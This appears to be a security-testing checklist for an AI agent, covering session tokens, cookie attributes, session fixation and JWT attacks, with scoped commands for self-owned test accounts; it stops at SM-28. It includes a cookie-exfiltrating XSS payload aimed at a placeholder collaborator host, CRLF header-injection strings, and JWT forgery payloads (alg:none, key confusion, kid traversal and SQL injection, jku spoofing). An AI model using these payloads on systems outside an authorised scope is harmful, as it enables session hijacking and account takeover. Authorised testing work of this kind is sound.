# Session Management: 40-Check Ledger

**Progress:** `[ 0 / 40 assessed ]`

Every check below follows the same layout: **severity if vulnerable**, tags, objective, commands, pass/fail criteria, and references. Use only self-owned test accounts **A** (attacker) and **B** (victim). `$T` = target base URL, `$S` = `.agents/skills/session-management/scripts`, `$E` = `artifacts/session/evidence`.

Status values: `PASS` · `FINDING` · `INFO` · `NOT_APPLICABLE` · `BLOCKED` (see SKILL.md). Record every row in `artifacts/session/session_checklist_40.tsv`.

Shorthand for OWASP WSTG Session Management Testing pages:
`WSTG/` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/`

---

## SM-A — Token Generation & Exposure

### SM-01 · Test session token entropy and predictability — `HIGH`
Tags: `session` `token-entropy` `prediction` · Subagent: SM-A

Collect a large sample of freshly issued tokens and analyse them statistically for low entropy, sequential components, timestamps, or reused segments.

```bash
$S/collect_tokens.sh --target example.com --url $T/login --cookie SESSIONID --count 200 --delay 0.25 \
  --out artifacts/session/tokens_raw.txt
python3 -I $S/token_entropy.py artifacts/session/tokens_raw.txt | tee artifacts/session/entropy_report.txt
# Burp: send the token-issuing request to Sequencer → Live capture ≥ 10,000 tokens if bounded rate is allowed,
#       or Manual load of tokens_raw.txt → Analyze now. Check "effective entropy" and FIPS tests.
```

- **Fail:** effective entropy < 64 bits; Sequencer rates "poor"/"extremely poor"; visible counters, timestamps, user IDs, or MD5(time) patterns; duplicates.
- **Pass:** ≥ 64 bits effective entropy (OWASP minimum), no positional bias, no duplicates.
- **Refs:** https://portswigger.net/burp/documentation/desktop/tools/sequencer · https://portswigger.net/web-security/authentication/securing · `WSTG/01-Testing_for_Session_Management_Schema` · https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-id-entropy

### SM-02 · Check session token length (≥ 128 bits / 16 bytes) — `MEDIUM`
Tags: `session` `token-length` · Subagent: SM-A

Decode the token's encoding (hex, base64, base64url) and measure raw byte length. Distinguish random material from structured parts (prefixes, signatures, embedded IDs).

```bash
python3 -I $S/token_entropy.py artifacts/session/tokens_raw.txt --lengths-only
echo -n "$TOKEN" | base64 -d 2>/dev/null | wc -c     # if base64
echo -n "$TOKEN" | wc -c                              # if hex: bytes = chars / 2
```

- **Fail:** random portion < 16 bytes (128 bits), or the length is long but most bytes are static/derivable.
- **Pass:** ≥ 128 bits of random material (OWASP recommends ≥ 64 bits *entropy* within ≥ 128-bit IDs).
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-id-length · ASVS V3.2.2

### SM-09 · Test for session token in URL query string — `MEDIUM`
Tags: `session` `url-exposure` `info-disclosure` · Subagent: SM-A

Search proxy history, crawler output, redirects, and email links for session IDs, JWTs, or auth tokens in URLs (`;jsessionid=`, `?sid=`, `?token=`, `#access_token=`).

```bash
grep -Eio '([?&;#](jsessionid|phpsessid|sid|session|sessionid|token|access_token|auth|jwt)=)[^&# ]+' \
  artifacts/discovered_endpoints.txt proxy_history.har | sort -u
curl -sk -o /dev/null -D - "$T/;jsessionid=bbtest" | grep -i 'set-cookie\|location'   # URL rewriting enabled?
```

- **Fail:** a valid session/auth token appears in a URL (logged by proxies, browser history, Referer).
- **Pass:** tokens only in cookies or headers; URL rewriting disabled.
- **Refs:** https://portswigger.net/kb/issues/00500700_session-token-in-url · `WSTG/04-Testing_for_Exposed_Session_Variables`

### SM-19 · Check for session token disclosure in server access logs — `MEDIUM`
Tags: `session` `logging` `info-disclosure` · Subagent: SM-A

Usually needs whitebox/log access. Black-box evidence: tokens in URLs (SM-09), tokens in GET parameters of API calls, or exposed log files found by `contentdiscovery` (`/logs/access.log`, `/server-status`, debug consoles).

```bash
grep -Ei 'access\.log|server-status|/logs?/|debug' artifacts/sensitive_files.txt
curl -sk "$T/server-status?auto" | head          # Apache mod_status leaks request lines incl. query strings
```

- **Fail:** session tokens visible in any exposed log, status page, or monitoring endpoint; or tokens sent in GET query strings (which standard access logs record).
- **Pass / BLOCKED:** no exposure found; mark `BLOCKED` if no log access and no indirect evidence.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude · `WSTG/04-Testing_for_Exposed_Session_Variables`

### SM-20 · Test for session token disclosure via Referer to external sites — `MEDIUM`
Tags: `session` `referer` `third-party` · Subagent: SM-A

If any token is in a URL, check whether pages carrying it load third-party resources or link off-site, and what `Referrer-Policy` is set.

```bash
curl -sk -D - "$T/page?token=$TOKEN_A" -o $E/SM-20_page.html | grep -i referrer-policy
grep -Eo '(src|href)="https?://[^"]+' $E/SM-20_page.html | grep -v "$(echo $T | sed 's#https\?://##')" | sort -u
# Browser: open the page with devtools → Network → inspect Referer on third-party requests
```

- **Fail:** third-party requests receive a Referer containing the token (no `Referrer-Policy: no-referrer`/`strict-origin*`).
- **Pass:** no tokens in URLs, or Referrer-Policy strips path/query cross-origin.
- **Refs:** https://portswigger.net/kb/issues/00500400_cross-domain-referer-leakage · `WSTG/04-Testing_for_Exposed_Session_Variables`

### SM-35 · Check session storage security (server-side vs client-side) — `HIGH`
Tags: `session` `storage` `client-side-state` · Subagent: SM-A

Determine whether the session token is an opaque pointer to server-side state, or carries state itself (JWT, signed/encrypted cookie such as Flask `session`, Rails `_session`, Express `cookie-session`, ASP.NET ViewState). Also check whether the SPA stores tokens in `localStorage`/`sessionStorage` (readable by any XSS).

```bash
python3 -I $S/jwt_inspect.py "$TOKEN" || echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null
# Flask: flask-unsign --decode --cookie "$COOKIE" ; then flask-unsign --unsign --cookie "$COOKIE" (offline secret check)
# Browser devtools console (own session): Object.keys(localStorage); Object.keys(sessionStorage)
```

- **Fail:** client-side state is unsigned/weakly signed and tamperable; contains secrets/PII; long-lived bearer tokens in Web Storage with no XSS mitigation.
- **Pass:** opaque server-side session, or properly signed (strong key) and minimal client-side state; tokens in HttpOnly cookies.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage · https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

### SM-37 · Check for session token in POST body — `LOW`
Tags: `session` `transport` · Subagent: SM-A

Identify requests where the session token is sent as a form/JSON body field rather than a cookie or header. Test whether the server also accepts it from the query string (method/param interchange).

```bash
# Replay a body-token request with the token moved to the query string
curl -sk "$T/api/me?session=$TOKEN_A" -o $E/SM-37_query.txt -w '%{http_code}\n'
```

- **Fail:** server accepts the token from the URL (→ SM-09 exposure) or body-only tokens bypass cookie protections (SameSite/HttpOnly) in a way that enables CSRF or leakage.
- **Pass:** session carried by cookie/Authorization header only; other carriers rejected.
- **Refs:** `WSTG/04-Testing_for_Exposed_Session_Variables` · ASVS V3.1.1

### SM-39 · Check session token predictability across different user accounts — `HIGH`
Tags: `session` `prediction` `cross-account` · Subagent: SM-A

Log in as A and B alternately (5–10 times each, within account limits) and compare tokens for shared structure, user-ID/username/email encoding, incrementing components, or timestamp correlation.

```bash
# Save one post-login token per line, prefixed by account: "A <token>" / "B <token>"
python3 -I $S/token_entropy.py artifacts/session/tokens_login_ab.txt --labelled
```

- **Fail:** any portion derivable from user identity or login time; tokens for B predictable from A's.
- **Pass:** no shared non-random structure beyond fixed prefixes/versions.
- **Refs:** `WSTG/01-Testing_for_Session_Management_Schema` · https://portswigger.net/burp/documentation/desktop/tools/sequencer

---

## SM-B — Session Lifecycle

### SM-03 · Test for session fixation (session ID not rotating after login) — `HIGH`
Tags: `session` `fixation` `regeneration` · Subagent: SM-B

Set a known pre-auth session ID before authentication and verify whether a new session is issued after login.

```bash
curl -sk -c $E/pre.txt "$T/login" -o /dev/null; PRE=$(awk '/SESSIONID/{print $7}' $E/pre.txt)
curl -sk -b "SESSIONID=$PRE" -c $E/post.txt -D $E/SM-03_login.txt \
  -d 'username=A&password=***' "$T/login" -o /dev/null
awk '/SESSIONID/{print $7}' $E/post.txt     # empty or equal to $PRE → ID was NOT rotated
curl -sk -b "SESSIONID=$PRE" "$T/account" -o $E/SM-03_reuse.txt -w '%{http_code}\n'
```

- **Fail:** the pre-login ID is authenticated after login (attacker who planted it is now logged in as the victim).
- **Pass:** new ID issued on login; old ID invalid or still anonymous.
- **Refs:** https://owasp.org/www-community/attacks/Session_fixation · `WSTG/03-Testing_for_Session_Fixation`

### SM-04 · Check if session ID changes after successful login — `HIGH`
Tags: `session` `rotation` · Subagent: SM-B

Complements SM-03 for every session carrier (all cookies, bearer tokens, custom headers), including SSO/OAuth callback logins and "remember me" logins.

```bash
diff <(grep -i set-cookie $E/SM-03_login.txt) /dev/null
# Repeat for: SSO callback, magic link, remember-me auto-login, MFA step completion
```

- **Fail:** any carrier with authority keeps its pre-auth value, or is rotated only after MFA step 1 but not step 2.
- **Pass:** all authority-bearing tokens regenerated at each authentication boundary.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change · ASVS V3.2.1

### SM-05 · Test if session is properly invalidated after logout — `MEDIUM`
Tags: `session` `logout` `invalidation` · Subagent: SM-B

Capture an authenticated request as A, log out, then replay the captured request with the old token.

```bash
curl -sk -b "SESSIONID=$TOKEN_A" "$T/account" -o /dev/null -w 'before %{http_code}\n'
curl -sk -b "SESSIONID=$TOKEN_A" "$T/logout" -o /dev/null
curl -sk -b "SESSIONID=$TOKEN_A" "$T/account" -o $E/SM-05_after.txt -w 'after %{http_code}\n'
# Repeat for Authorization: Bearer / refresh token / API endpoints separately
```

- **Fail:** old token still returns authenticated content (common with JWTs and when logout only clears the cookie client-side).
- **Pass:** server rejects the token after logout on every endpoint (web, API, mobile, WebSocket).
- **Refs:** `WSTG/06-Testing_for_Logout_Functionality` · https://portswigger.net/web-security/authentication/securing

### SM-06 · Check session timeout configuration (idle and absolute expiry) — `LOW`
Tags: `session` `timeout` · Subagent: SM-B

Measure idle timeout (no activity) and absolute lifetime (continuous activity). Compare against the app's risk class (OWASP: 2–5 min high-value, 15–30 min low-risk idle).

```bash
# Idle: authenticate, wait N minutes, single request. Binary-search N (5, 15, 30, 60, 240, 1440).
# Absolute: keep-alive every 5 min with a cheap authenticated GET and record when it dies.
while true; do date; curl -sk -b "SESSIONID=$TOKEN_A" "$T/api/me" -o /dev/null -w '%{http_code}\n'; sleep 300; done \
  | tee $E/SM-06_absolute.log
```

- **Fail:** no idle timeout, or absolute lifetime unbounded/very long for a sensitive app; cookie `Expires` far in the future with no server-side expiry.
- **Pass:** server-enforced idle and absolute timeouts appropriate to sensitivity.
- **Refs:** `WSTG/07-Testing_Session_Timeout` · https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-expiration

### SM-07 · Test concurrent session control — `LOW`
Tags: `session` `concurrency` · Subagent: SM-B

Log in as A from two clients (different browsers/IPs). Check whether both remain valid, whether the user is notified, and whether a "log out other sessions" feature actually kills them.

```bash
# Client 1 token = T1, client 2 token = T2 (both account A)
for t in "$T1" "$T2"; do curl -sk -b "SESSIONID=$t" "$T/api/me" -o /dev/null -w '%{http_code}\n'; done
# Trigger "sign out of all other sessions" from client 2, then re-test T1
```

- **Fail:** "log out everywhere" / session list does not actually revoke other sessions; policy-required limits not enforced.
- **Pass / INFO:** concurrent sessions are a business decision; report `INFO` unless a stated control is broken.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#simultaneous-session-logons · ASVS V3.3.4

### SM-08 · Check if session tokens are invalidated on password change — `MEDIUM`
Tags: `session` `password-change` `invalidation` · Subagent: SM-B

Log in as A on client 1 and client 2. Change password on client 2 (and separately, via password reset). Test client 1's token.

```bash
curl -sk -b "SESSIONID=$T1" "$T/api/me" -o $E/SM-08_after_change.txt -w '%{http_code}\n'
# Also test refresh token from client 1, and JWTs (often survive until exp)
```

- **Fail:** other sessions survive password change/reset (attacker who stole a session keeps access after the victim "secures" the account).
- **Pass:** all other sessions and refresh tokens revoked; the current one is rotated.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html · ASVS V3.3.3 · https://portswigger.net/web-security/authentication/other-mechanisms

### SM-34 · Test session token regeneration on privilege level change — `MEDIUM`
Tags: `session` `privilege-change` `regeneration` · Subagent: SM-B

Identify transitions: guest→user, user→MFA-verified, user→admin/"sudo mode", tenant switch, role grant. Check whether the token rotates at each.

```bash
# Record token before and after each transition; reuse the pre-transition token on a post-transition endpoint
curl -sk -b "SESSIONID=$PRE_ELEVATION" "$T/admin/settings" -o $E/SM-34.txt -w '%{http_code}\n'
```

- **Fail:** same token across a privilege boundary (a fixated or leaked low-priv token becomes high-priv).
- **Pass:** new token on every privilege change.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change · `WSTG/03-Testing_for_Session_Fixation`

### SM-36 · Test for session fixation via Set-Cookie in login response — `HIGH`
Tags: `session` `fixation` `set-cookie` · Subagent: SM-B

Check whether the server accepts an attacker-chosen session ID (e.g., one never issued by it) and whether a session value can be planted cross-origin: via a URL parameter (`?PHPSESSID=`), a sibling subdomain setting a parent-domain cookie, or CRLF (SM-13).

```bash
curl -sk -b "SESSIONID=bbtest0000000000000000000000000000" -D $E/SM-36.txt \
  -d 'username=A&password=***' "$T/login" -o /dev/null
grep -i 'set-cookie' $E/SM-36.txt     # no new Set-Cookie + authenticated → server adopted attacker value
curl -sk -D - "$T/login?PHPSESSID=bbtest123" -o /dev/null | grep -i set-cookie
```

- **Fail:** server adopts an arbitrary/attacker-supplied ID ("permissive" session management) or a planting vector exists combined with no rotation.
- **Pass:** unknown IDs rejected/replaced; login response always sets a fresh ID.
- **Refs:** `WSTG/03-Testing_for_Session_Fixation` · https://owasp.org/www-community/attacks/Session_fixation

---

## SM-C — Cookie Attributes & Transport

Run once: `curl -sk -D artifacts/session/login_response_headers.txt -d 'username=A&password=***' "$T/login" -o /dev/null && python3 -I $S/cookie_audit.py artifacts/session/login_response_headers.txt --session-names SESSIONID | tee artifacts/session/cookie_audit.txt`

### SM-10 · Check Secure flag on session cookies — `MEDIUM`
Tags: `cookie` `secure-flag` `transport` · Subagent: SM-C

- **Fail:** authority-bearing cookie lacks `Secure` **and** the site is reachable over HTTP (or no HSTS preload), so the cookie can leak in cleartext.
- **Pass:** `Secure` on every session cookie.
- **Refs:** https://owasp.org/www-community/controls/SecureCookieAttribute · `WSTG/02-Testing_for_Cookies_Attributes`

### SM-11 · Check HttpOnly flag on session cookies — `MEDIUM`
Tags: `cookie` `httponly` `xss` · Subagent: SM-C

```js
// Devtools console, own session:
document.cookie.split('; ').map(c => c.split('=')[0])   // session cookie name present → readable by JS
```

- **Fail:** session cookie readable by JavaScript. Severity rises to High when combined with a working XSS (SM-16).
- **Pass:** `HttpOnly` set on all session cookies (CSRF double-submit cookies are a documented exception).
- **Refs:** https://owasp.org/www-community/HttpOnly · `WSTG/02-Testing_for_Cookies_Attributes`

### SM-12 · Check SameSite attribute on session cookies — `MEDIUM`
Tags: `cookie` `samesite` `csrf` · Subagent: SM-C

Missing SameSite defaults to `Lax` in Chromium (with a 2-minute Lax+POST window after cookie issuance) but not in all browsers. Look for SameSite bypasses: state-changing GETs, method override (`_method=POST`), sibling-domain gadgets, client-side redirects, cookie refresh to reopen the 2-minute window.

```bash
grep -i samesite artifacts/session/cookie_audit.txt
curl -sk -b "SESSIONID=$TOKEN_A" "$T/account/email?_method=POST&email=a2@example.test" -o /dev/null -w '%{http_code}\n'
```

- **Fail:** `SameSite=None` (or missing) on a session cookie used by state-changing endpoints without CSRF tokens; or a Lax/Strict bypass is demonstrated.
- **Pass:** `Lax`/`Strict` with no bypass gadgets, plus CSRF tokens on state changes.
- **Refs:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions · https://owasp.org/www-community/SameSite

### SM-13 · Test for cookie injection via CRLF in headers — `HIGH`
Tags: `cookie` `crlf` `header-injection` · Subagent: SM-C

Inject `%0d%0aSet-Cookie:` into parameters reflected in response headers (redirect `Location`, custom headers, filenames in `Content-Disposition`). Use a benign marker and a cache-buster.

```bash
for p in '%0d%0aSet-Cookie:%20bbtest=1' '%0aSet-Cookie:%20bbtest=1' '%E5%98%8A%E5%98%8DSet-Cookie:%20bbtest=1'; do
  curl -sk -D - -o /dev/null "$T/redirect?url=/home$p&cb=$RANDOM" | grep -i 'bbtest' && echo "INJECTED: $p"
done
```

- **Fail:** injected `Set-Cookie` appears as a real header (enables session fixation SM-36, cookie tossing, XSS via response splitting).
- **Pass:** CR/LF stripped or encoded in all header sinks.
- **Refs:** https://owasp.org/www-community/vulnerabilities/CRLF_Injection · https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling

### SM-14 · Check session cookie Domain scope — `LOW`
Tags: `cookie` `domain-scope` · Subagent: SM-C

A `Domain=.example.com` cookie is sent to every subdomain — including user-content hosts, staging, or takeover candidates (cross-reference `subdomain-takeover` and `subdomainenum` output).

- **Fail:** session cookie scoped to the parent domain while any sibling subdomain is untrusted, user-controlled, or vulnerable (XSS/takeover) → cookie theft or cookie tossing.
- **Pass:** host-only cookie (no `Domain` attribute) or parent scope with all siblings trusted.
- **Refs:** `WSTG/02-Testing_for_Cookies_Attributes` · https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-via-vulnerable-sibling-domains

### SM-15 · Check session cookie Path scope — `INFO`
Tags: `cookie` `path-scope` · Subagent: SM-C

Applications sharing a host under different paths (`/app1`, `/legacy`, `/blog`) receive each other's `Path=/` cookies.

- **Fail / INFO:** `Path=/` while another, less-trusted application lives on the same host. Note: Path is not a security boundary against same-origin JS.
- **Pass:** narrowest practical Path, or a single application per host.
- **Refs:** `WSTG/02-Testing_for_Cookies_Attributes`

### SM-38 · Test for session migration between HTTP and HTTPS — `MEDIUM`
Tags: `session` `transport` `downgrade` · Subagent: SM-C

```bash
curl -s -D - "http://${T#https://}/" -o /dev/null | grep -Ei 'location|set-cookie|strict-transport'
curl -sk -D - "$T/" -o /dev/null | grep -i strict-transport-security
# Is a session cookie issued over HTTP? Does an HTTP-issued ID become authenticated after HTTPS login (fixation)?
```

- **Fail:** cookies issued or accepted over HTTP; HTTP pages share the session with HTTPS; no HSTS on the session host.
- **Pass:** HTTP → 301 to HTTPS with no cookie; HSTS (`max-age ≥ 31536000; includeSubDomains`); fresh session after HTTPS login.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html · `WSTG/02-Testing_for_Cookies_Attributes`

### SM-40 · Test session cookie prefix (`__Host-` / `__Secure-`) — `LOW`
Tags: `cookie` `prefix` `cookie-tossing` · Subagent: SM-C

`__Host-` cookies must be `Secure`, `Path=/`, and have no `Domain` — this blocks sibling-subdomain cookie tossing and fixation.

- **Fail / INFO:** no prefix while a cookie-tossing vector (SM-14, SM-13, sibling XSS/takeover) exists → report with that chain; otherwise `INFO`.
- **Pass:** `__Host-` prefix on session cookies (or `__Secure-` where a Domain is required).
- **Refs:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#cookie_prefixes · https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies

---

## SM-D — Binding & Cross-Channel

### SM-16 · Test for session hijacking via XSS — `HIGH`
Tags: `session` `xss` `hijacking` · Subagent: SM-D

Only when an XSS has been found (by the XSS skill or manually). Demonstrate impact in **your own** session: read the token (cookie without HttpOnly, or Web Storage), replay it from a second clean client.

```js
// PoC payload, executed in account A's own browser; sends to a collaborator you control
fetch('https://YOUR-COLLAB.oastify.com/?c='+encodeURIComponent(document.cookie+'|'+JSON.stringify(localStorage)))
```

```bash
curl -sk -b "SESSIONID=<value from collaborator log>" "$T/api/me" -o $E/SM-16_replay.txt -w '%{http_code}\n'
```

- **Fail:** stolen value grants A's session on another client.
- **Pass:** XSS cannot reach session material (HttpOnly + no tokens in Web Storage). Note XSS can still ride the session; report XSS separately.
- **Refs:** https://portswigger.net/web-security/cross-site-scripting/exploiting · `WSTG/09-Testing_for_Session_Hijacking` · https://owasp.org/www-community/attacks/Session_hijacking_attack

### SM-17 · Check if sessions are bound to client IP address — `INFO`
Tags: `session` `binding` `ip` · Subagent: SM-D

Replay A's session from a different egress IP (VPN/cloud host you control).

- **Result:** binding is defence-in-depth. Report `INFO` if absent; note that strict IP binding breaks mobile users, so many apps intentionally omit it. Note whether the app *trusts* `X-Forwarded-For` for binding (spoofable → `FINDING` if it bypasses a stated control).
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#binding-the-session-id-to-other-user-properties

### SM-18 · Test if sessions are bound to User-Agent — `INFO`
Tags: `session` `binding` `user-agent` · Subagent: SM-D

```bash
curl -sk -b "SESSIONID=$TOKEN_A" -A 'bbtest-different-UA/1.0' "$T/api/me" -o /dev/null -w '%{http_code}\n'
```

- **Result:** UA binding is weak (attacker can copy UA). Absence is `INFO`; presence is noted as a minor hurdle in hijack chains.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#binding-the-session-id-to-other-user-properties

### SM-31 · Check refresh tokens are securely stored and rotated — `HIGH`
Tags: `session` `refresh-token` `rotation` · Subagent: SM-D

Locate the refresh flow (`/oauth/token`, `/auth/refresh`, `grant_type=refresh_token`). Test: storage location; rotation on use; reuse detection (old refresh token used after rotation should revoke the whole family); revocation on logout/password change; lifetime.

```bash
R1=<refresh token>
curl -sk -X POST "$T/auth/refresh" -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$R1\"}" -o $E/SM-31_r1.json
# Extract R2 from response, then reuse R1:
curl -sk -X POST "$T/auth/refresh" -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$R1\"}" -w '%{http_code}\n'
# After reuse of R1, does R2 still work? (Reuse detection should kill R2 too.)
```

- **Fail:** refresh token not rotated, reuse accepted, survives logout/password change, stored in localStorage, or near-unlimited lifetime.
- **Pass:** one-time-use rotation with family revocation; HttpOnly storage; bounded lifetime.
- **Refs:** https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html · RFC 9700 §4.14 (OAuth 2.0 Security BCP, refresh token protection)

### SM-32 · Test session token in WebSocket upgrade handshake — `HIGH`
Tags: `session` `websocket` `cswsh` · Subagent: SM-D

Inspect how the WebSocket authenticates: cookie on the upgrade (CSWSH risk if no Origin check / no CSRF token), token in the URL (`wss://…?token=` → logging, SM-09), or a first-message auth frame. Test Origin validation and post-logout validity.

```bash
curl -sk -i -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' \
  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Origin: https://evil.example' \
  -b "SESSIONID=$TOKEN_A" "$T/ws" | head -5          # 101 with a foreign Origin → CSWSH candidate
```

- **Fail:** cookie-authenticated handshake accepted from a foreign Origin (Cross-Site WebSocket Hijacking); token in URL; socket stays authenticated after logout.
- **Pass:** Origin allowlist or per-connection CSRF token; token not in URL; server closes socket on logout.
- **Refs:** https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking · https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets

### SM-33 · Check CSRF token is tied to the session — `MEDIUM`
Tags: `session` `csrf` `token-binding` · Subagent: SM-D

Classic PortSwigger patterns: token validated only if present; token not tied to session (A's token accepted with B's session); token tied to a non-session cookie (cookie-injection bypass); double-submit cookie with no server binding.

```bash
# Use A's CSRF token in B's session on a harmless state change (e.g., B updates own display name)
curl -sk -b "SESSIONID=$TOKEN_B" -d "csrf=$CSRF_A&display_name=bbtest" "$T/account/profile" -w '%{http_code}\n'
# Remove the token parameter entirely; change POST to GET; send an empty token
```

- **Fail:** any variant accepted.
- **Pass:** token bound to the server-side session, required on all state changes, and method changes rejected.
- **Refs:** https://portswigger.net/web-security/csrf/bypassing-token-validation · https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html · `WSTG/05-Testing_for_Cross_Site_Request_Forgery`

---

## SM-E — JWT Deep Testing

Run `python3 -I $S/jwt_inspect.py "$JWT_A" | tee artifacts/session/jwt_analysis.md` first. Install `jwt_tool` (`git clone https://github.com/ticarpi/jwt_tool`) and Burp's **JWT Editor** extension. All forged tokens use A's identity unless cross-user proof is explicitly authorized.

### SM-21 · Test JWT security (algorithm, signing, expiry claims) — `MEDIUM`
Tags: `jwt` `review` · Subagent: SM-E

Baseline review: `alg`, `typ`, `kid`/`jku`/`x5u`/`jwk` headers, `exp`/`nbf`/`iat`/`iss`/`aud`/`jti` claims, lifetime, whether the signature is verified at all (flip one payload character, re-send unchanged signature).

```bash
python3 jwt_tool.py "$JWT_A"                                   # decode + header/claim summary
python3 jwt_tool.py -t "$T/api/me" -rh "Authorization: Bearer $JWT_A" -M at   # all-tests scan (scope-approved only)
```

- **Fail:** unverified signature; missing `exp`; no `aud`/`iss` checks enabling cross-service token reuse.
- **Refs:** https://portswigger.net/web-security/jwt · `WSTG/10-Testing_JSON_Web_Tokens` · RFC 8725 (JWT Best Current Practices)

### SM-22 · Test JWT `none` algorithm bypass — `CRITICAL`
Tags: `jwt` `alg-none` `signature-bypass` · Subagent: SM-E

```bash
python3 jwt_tool.py "$JWT_A" -X a        # emits alg:none / None / NONE / nOnE variants with empty signature
# Send each to an authenticated endpoint; keep the trailing dot: header.payload.
```

- **Fail:** any unsigned variant accepted.
- **Refs:** https://portswigger.net/web-security/jwt#flawed-jwt-signature-verification · https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html

### SM-23 · Test JWT algorithm confusion (RS256 → HS256) — `CRITICAL`
Tags: `jwt` `alg-confusion` `key-confusion` · Subagent: SM-E

Obtain the server's public key (`/.well-known/jwks.json`, `/jwks.json`, `/.well-known/openid-configuration`, TLS cert, or derive it from two tokens with PortSwigger `sig2n`). Re-sign the token with HS256 using the PEM public key bytes as the HMAC secret.

```bash
curl -sk "$T/.well-known/jwks.json" -o artifacts/session/jwks.json
python3 jwt_tool.py "$JWT_A" -X k -pk artifacts/session/public.pem
# No published key: docker run --rm -it portswigger/sig2n "$JWT_1" "$JWT_2"
```

- **Fail:** HS256 token signed with the public key is accepted.
- **Refs:** https://portswigger.net/web-security/jwt/algorithm-confusion

### SM-24 · Check JWT secret strength (offline brute force) — `CRITICAL`
Tags: `jwt` `weak-secret` `hmac` · Subagent: SM-E

Only for HS256/384/512. Offline, against your own token.

```bash
hashcat -a 0 -m 16500 "$JWT_A" /path/to/jwt.secrets.list      # e.g. wallarm/jwt-secrets list
python3 jwt_tool.py "$JWT_A" -C -d /path/to/jwt.secrets.list
```

- **Fail:** secret recovered → arbitrary token forgery. Prove by signing a token for A only and replaying it.
- **Pass:** not cracked with common/framework-default lists (note list used and duration).
- **Refs:** https://portswigger.net/web-security/jwt#brute-forcing-secret-keys · https://github.com/wallarm/jwt-secrets

### SM-25 · Test JWT expiration (`exp`) and not-before (`nbf`) — `MEDIUM`
Tags: `jwt` `exp` `nbf` · Subagent: SM-E

Wait past `exp` and replay; if a signing primitive is available (SM-22/23/24), set `exp` in the past / `nbf` in the future and check enforcement. Check clock-skew allowance and lifetime (`exp - iat`).

```bash
python3 -I $S/jwt_inspect.py "$JWT_A" | grep -Ei 'exp|nbf|iat|lifetime'
```

- **Fail:** expired tokens accepted; no `exp`; access-token lifetime of days/months.
- **Refs:** RFC 7519 §4.1.4–4.1.5 · https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html

### SM-26 · Check JWT for sensitive data in payload — `MEDIUM`
Tags: `jwt` `info-disclosure` · Subagent: SM-E

JWS payloads are only base64url-encoded. Look for PII, internal IDs, roles/permissions, emails of others, password hashes, API keys, internal hostnames.

- **Fail:** secrets or unnecessary sensitive data in a JWS readable by any holder or logged by intermediaries.
- **Refs:** `WSTG/10-Testing_JSON_Web_Tokens` · RFC 8725 §3.6

### SM-27 · Test JWT `jku` / `x5u` header injection — `CRITICAL`
Tags: `jwt` `jku` `x5u` `ssrf` · Subagent: SM-E

Host a JWKS you control and point `jku`/`x5u` at it; sign with your own key. Also try embedding a key directly via the `jwk` header. Test allowlist bypasses (`https://trusted.example@attacker`, open redirects on the trusted domain). Any outbound fetch is also an SSRF signal — hand off to `ssrf-audit`.

```bash
python3 jwt_tool.py "$JWT_A" -X s -ju "https://YOUR-HOST/jwks.json"   # spoof JWKS
python3 jwt_tool.py "$JWT_A" -X i                                       # inject inline jwk (CVE-2018-0114 style)
```

- **Fail:** server fetches attacker JWKS or trusts an embedded `jwk` and accepts the forged token.
- **Refs:** https://portswigger.net/web-security/jwt#jwt-header-parameter-injections

### SM-28 · Test JWT `kid` parameter injection — `CRITICAL`
Tags: `jwt` `kid` `path-traversal` `sqli` · Subagent: SM-E

`kid` is often used to look up a key on disk or in a DB.

```bash
# Path traversal to a predictable file (empty /dev/null → sign with empty secret)
python3 jwt_tool.py "$JWT_A" -I -hc kid -hv "../../../../../../../dev/null" -S hs256 -p ""
# SQLi returning a known key
python3 jwt_tool.py "$JWT_A" -I -hc kid -hv "x' UNION SELECT 'bbkey'-- -" -S hs256 -p "bbkey"
```

- **Fail:** forged token accepted; or errors reveal path/SQL handling (hand off to path-traversal/SQLi skills).
